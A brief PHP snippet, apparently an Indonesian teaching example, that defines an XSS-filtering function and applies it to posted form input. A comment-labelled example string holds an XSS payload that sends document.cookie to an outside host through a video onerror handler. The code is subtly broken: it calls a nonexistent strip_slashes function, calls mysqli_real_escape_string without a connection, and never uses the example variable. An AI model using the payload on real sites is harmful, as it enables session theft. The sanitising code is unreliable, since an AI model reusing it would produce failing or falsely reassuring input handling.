function filterxss($data){

$filterxss = strip_slashes(strip_tags(htmlspecialchars(htmlentities($data,ENT_QUOTES))));

return $filterxss;

}
	$message = '<script>alert(1)</script> atau <video><source onerror=location=/\02.rs/+document.cookie> '; // contoh serangan xss
	$input = mysqli_real_escape_string(trim(filterxss($_POST['message'])));
	echo $input;
		
		

